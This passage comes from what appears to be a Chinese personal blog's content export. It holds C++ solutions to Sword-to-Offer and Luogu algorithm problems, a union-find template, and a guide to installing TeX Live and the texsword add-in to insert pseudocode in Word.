<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> _n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">double</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">long</span> n = _n;  <span class="comment">// 防止n取到负数边界，导致转正数时溢出</span></span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">0</span>) x = <span class="number">1</span>/x, n = -n;  <span class="comment">// 将n&lt;0的问题转为n&gt;0</span></span><br><span class="line">        <span class="keyword">while</span> (n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; <span class="number">1</span>) res *= x;  <span class="comment">// n为奇数时需要多乘一个x</span></span><br><span class="line">            x *= x;  <span class="comment">// n除以2，将x^2给到x，逐渐降低幂次</span></span><br><span class="line">            n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="删除链表结点"><a href="#删除链表结点" class="headerlink" title="删除链表结点"></a>删除链表结点</h3><p><a href="https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof/">https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof/</a></p>
<p>如果下一节点不为空，当下一节点值满足期望时，将下一节点的下一节点的指针给到当前节点的下一节点即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteNode</span><span class="params">(ListNode* head, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        ListNode* _dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);  <span class="comment">// _dummyHead就不需要判断head是不是头结点</span></span><br><span class="line">        _dummyHead-&gt;next = head;</span><br><span class="line">        ListNode* cur = _dummyHead;</span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur-&gt;next-&gt;val == val) &#123;</span><br><span class="line">                cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> _dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="删除链表中重复的节点"><a href="#删除链表中重复的节点" class="headerlink" title="删除链表中重复的节点"></a>删除链表中重复的节点</h3><p><a href="https://www.acwing.com/problem/content/27/">https://www.acwing.com/problem/content/27/</a></p>
<p><img src="/2021/07/05/%E5%89%91%E6%8C%87Offer%E6%89%93%E5%8D%A1/-56e05a265f03026c.png" alt="-56e05a265f03026c"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">deleteDuplication</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 虚拟头节点可以简化代码，否则如果删除头结点会比较麻烦</span></span><br><span class="line">        ListNode* dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy-&gt;next = head;</span><br><span class="line">        ListNode* p = dummy;</span><br><span class="line">        <span class="keyword">while</span> (p-&gt;next) &#123;</span><br><span class="line">            <span class="keyword">auto</span> q = p-&gt;next;  <span class="comment">// 为了知道重复节点的区域长度（实际上是开了一个新结构，然后比对值），</span></span><br><span class="line">            <span class="keyword">while</span> (q &amp;&amp; p-&gt;next-&gt;val == q-&gt;val) q = q-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next-&gt;next == q) p = p-&gt;next; </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span> p-&gt;next = q;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="正则表达式匹配"><a href="#正则表达式匹配" class="headerlink" title="正则表达式匹配"></a>正则表达式匹配</h2><p><a href="https://www.acwing.com/problem/content/28/">https://www.acwing.com/problem/content/28/</a></p>
<p><code>f[i][j]</code>表示p从j开始到结尾，是否能匹配s从i开始到结尾</p>
<ol>
<li>p[j]是正常字符，<code>f[i][j]=s[i]==p[j]&amp;&amp;f[i+1][j+1]</code></li>
<li>p[j]是”.”，<code>f[i][j]=f[i+1][j+1]</code></li>
<li>p[j+1]是”<em>“，<code>s[i]==p[j]&amp;&amp;f[i][j]=f[i+1][j]||f[i][j+2]</code>（类似 `b</em>`这种情况）</li>
</ol>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>算法与数据结构</tag>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title>在Word中插入伪码</title>
    <url>/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/</url>
    <content><![CDATA[<h2 id="1-texlive-下载安装"><a href="#1-texlive-下载安装" class="headerlink" title="1 texlive 下载安装"></a>1 texlive 下载安装</h2><ol>
<li>下载 texlive2021 <a href="https://mirrors.ustc.edu.cn/CTAN/systems/texlive/Images/">https://mirrors.ustc.edu.cn/CTAN/systems/texlive/Images/</a></li>
</ol>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705190359766.png" alt="image-20210705190359766" style="zoom:80%;"></p>
<ol>
<li>用资源管理器打开，这样就会装载到 DVD 驱动器</li>
</ol>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705190808453.png" alt="image-20210705190808453"></p>
<ol>
<li>以管理员方式运行 install-tl-windows.bat，等待安装完毕</li>
</ol>
<h2 id="2-texsword-下载安装"><a href="#2-texsword-下载安装" class="headerlink" title="2 texsword 下载安装"></a>2 texsword 下载安装</h2><ol>
<li><p>下载地址 <a href="https://sourceforge.net/projects/texsword/，解压后将其中的四个文件都复制到">https://sourceforge.net/projects/texsword/，解压后将其中的四个文件都复制到</a> <code>C:\Users\自己的用户名\AppData\Roaming\Microsoft\Word\STARTUP</code> 中</p>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705193329388.png" alt="image-20210705193329388"></p>
</li>
<li><p>重启 Word，在加载项中可以找到 texsword 相关选项</p>
</li>
<li><p>点击 TEX，在源码区输入伪码（TeX 语法），然后运行即可</p>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705193441934.png" alt="image-20210705193441934"></p>
</li>
<li><p>效果如下</p>
</li>
</ol>
<p><img src="/2021/07/05/%E5%9C%A8Word%E4%B8%AD%E6%8F%92%E5%85%A5%E4%BC%AA%E7%A0%81/image-20210705193618881.png" alt="image-20210705193618881" style="zoom:80%;"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>注意一定要安装 texlive，texsword 才可正常使用</p>
<ol>
<li><p><a href="https://blog.csdn.net/aiwei169/article/details/81431363">https://blog.csdn.net/aiwei169/article/details/81431363</a></p>
</li>
<li><p><a href="https://www.neusncp.com/user/blog?id=151">https://www.neusncp.com/user/blog?id=151</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>tex</tag>
      </tags>
  </entry>
  <entry>
    <title>并查集模板与应用</title>
    <url>/2021/08/06/%E5%B9%B6%E6%9F%A5%E9%9B%86%E6%A8%A1%E6%9D%BF%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p><a href="https://labuladong.gitbook.io/algo/mu-lu-ye-1/mu-lu-ye-2/unionfind-suan-fa-xiang-jie">Union-Find算法详解 - labuladong 的算法小抄 (gitbook.io)</a></p>
<h2 id="并查集（模板）"><a href="#并查集（模板）" class="headerlink" title="并查集（模板）"></a>并查集（模板）</h2><h3 id="UF-类"><a href="#UF-类" class="headerlink" title="UF 类"></a>UF 类</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//构造并查集</span></span><br><span class="line">    <span class="built_in">UF</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">0</span>);</span><br><span class="line">        size = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            size[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回节点x的根节点</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = parent[parent[x]];<span class="comment">//路径压缩</span></span><br><span class="line">            x = parent[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断p 和 q是否互相连通</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">return</span> rootp == rootq;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将p和q连通</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (rootp == rootq)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//按秩合并，高树顶点做根</span></span><br><span class="line">        <span class="keyword">if</span> (size[rootp] &gt; size[rootq]) &#123;</span><br><span class="line">            parent[rootq] = rootp;</span><br><span class="line">            size[rootp] += size[rootq];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            parent[rootp] = rootq;</span><br><span class="line">            size[rootq] += size[rootp];</span><br><span class="line">        &#125;</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; parent;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; size; <span class="comment">//用来存储树的大小，为按秩合并做准备</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//构造并查集</span></span><br><span class="line">    <span class="built_in">UF</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">0</span>);</span><br><span class="line">        size = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            size[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回节点x的根节点</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = parent[parent[x]];<span class="comment">//路径压缩</span></span><br><span class="line">            x = parent[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断p 和 q是否互相连通</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">return</span> rootp == rootq;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将p和q连通</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (rootp == rootq)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//按秩合并，高树顶点做根</span></span><br><span class="line">        <span class="keyword">if</span> (size[rootp] &gt; size[rootq]) &#123;</span><br><span class="line">            parent[rootq] = rootp;</span><br><span class="line">            size[rootp] += size[rootq];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            parent[rootp] = rootq;</span><br><span class="line">            size[rootq] += size[rootp];</span><br><span class="line">        &#125;</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; parent;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; size; <span class="comment">//用来存储树的大小，为按秩合并做准备</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="function">UF <span class="title">uf</span><span class="params">(n)</span></span>;  <span class="comment">// 这里的n根据具体案例决定，比如有1，9的节点需要连通，那这里n就得是10，因为类中生成的数组是[0,9]的10个数</span></span><br><span class="line">    <span class="comment">// 如果使a,b连同</span></span><br><span class="line">    <span class="keyword">int</span> a, b;</span><br><span class="line">    cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">    uf.<span class="built_in">Union</span>(a,b);</span><br><span class="line">    <span class="comment">// 如果想判断 a,b 是否连通</span></span><br><span class="line">    uf.<span class="built_in">connected</span>(a, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="P3367-【模板】并查集"><a href="#P3367-【模板】并查集" class="headerlink" title="P3367 【模板】并查集"></a>P3367 【模板】并查集</h2><p><a href="https://www.luogu.com.cn/problem/P3367">https://www.luogu.com.cn/problem/P3367</a></p>
<p><img src="/2021/08/06/%E5%B9%B6%E6%9F%A5%E9%9B%86%E6%A8%A1%E6%9D%BF%E4%B8%8E%E5%BA%94%E7%94%A8/image-20210816094310822.png" alt="image-20210816094310822" style="zoom: 67%;"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//构造并查集</span></span><br><span class="line">    <span class="built_in">UF</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">0</span>);</span><br><span class="line">        size = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            size[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回节点x的根节点</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = parent[parent[x]];<span class="comment">//路径压缩</span></span><br><span class="line">            x = parent[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断p 和 q是否互相连通</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">return</span> rootp == rootq;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将p和q连通</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (rootp == rootq)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//按秩合并，高树顶点做根</span></span><br><span class="line">        <span class="keyword">if</span> (size[rootp] &gt; size[rootq]) &#123;</span><br><span class="line">            parent[rootq] = rootp;</span><br><span class="line">            size[rootp] += size[rootq];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            parent[rootp] = rootq;</span><br><span class="line">            size[rootq] += size[rootp];</span><br><span class="line">        &#125;</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; parent;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; size; <span class="comment">//用来存储树的大小，为按秩合并做准备</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N, M;</span><br><span class="line">    cin &gt;&gt; N &gt;&gt; M;</span><br><span class="line">    <span class="function">UF <span class="title">uf</span><span class="params">(N+<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; M; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> Z, X, Y;</span><br><span class="line">        cin &gt;&gt; Z &gt;&gt; X &gt;&gt; Y;</span><br><span class="line">        <span class="keyword">if</span> (Z == <span class="number">1</span>) &#123;</span><br><span class="line">            uf.<span class="built_in">Union</span>(X, Y);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (Z == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (uf.<span class="built_in">connected</span>(X, Y)) &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;Y&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;N&quot;</span> &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="P1551-亲戚"><a href="#P1551-亲戚" class="headerlink" title="P1551 亲戚"></a>P1551 亲戚</h2><p><a href="https://www.luogu.com.cn/problem/P1551">https://www.luogu.com.cn/problem/P1551</a></p>
<p><img src="/2021/08/06/%E5%B9%B6%E6%9F%A5%E9%9B%86%E6%A8%A1%E6%9D%BF%E4%B8%8E%E5%BA%94%E7%94%A8/image-20210818163607068.png" alt="image-20210818163607068"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//构造并查集</span></span><br><span class="line">    <span class="built_in">UF</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">0</span>);</span><br><span class="line">        size = vector&lt;<span class="keyword">int</span>&gt;(n, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">            size[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//返回节点x的根节点</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = parent[parent[x]];<span class="comment">//路径压缩</span></span><br><span class="line">            x = parent[x];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断p 和 q是否互相连通</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">return</span> rootp == rootq;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将p和q连通</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rootp = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> rootq = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (rootp == rootq)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//按秩合并，高树顶点做根</span></span><br><span class="line">        <span class="keyword">if</span> (size[rootp] &gt; size[rootq]) &#123;</span><br><span class="line">            parent[rootq] = rootp;</span><br><span class="line">            size[rootp] += size[rootq];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            parent[rootp] = rootq;</span><br><span class="line">            size[rootq] += size[rootp];</span><br><span class="line">        &#125;</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; parent;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; size; <span class="comment">//用来存储树的大小，为按秩合并做准备</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m, p;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m &gt;&gt; p;</span><br><span class="line"></span><br><span class="line">    <span class="function">UF <span class="title">uf</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> Mi, Mj;</span><br><span class="line">        cin &gt;&gt; Mi &gt;&gt; Mj;</span><br><span class="line">        uf.<span class="built_in">Union</span>(Mi, Mj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; p; ++j) &#123;</span><br><span class="line">        <span class="keyword">int</span> Pi, Pj;</span><br><span class="line">        cin &gt;&gt; Pi &gt;&gt; Pj;</span><br><span class="line">        <span class="keyword">if</span> (uf.<span class="built_in">connected</span>(Pi, Pj)) cout &lt;&lt; <span class="string">&quot;Yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="P1111-修复公路"><a href="#P1111-修复公路" class="headerlink" title="P1111 修复公路"></a>P1111 修复公路</h2><p><img src="/2021/08/06/%E5%B9%B6%E6%9F%A5%E9%9B%86%E6%A8%A1%E6%9D%BF%E4%B8%8E%E5%BA%94%E7%94%A8/image-20210818214206051.png" alt="image-20210818214206051" style="zoom:67%;"></p>
<ul>
<li>TODO</li>
</ul>
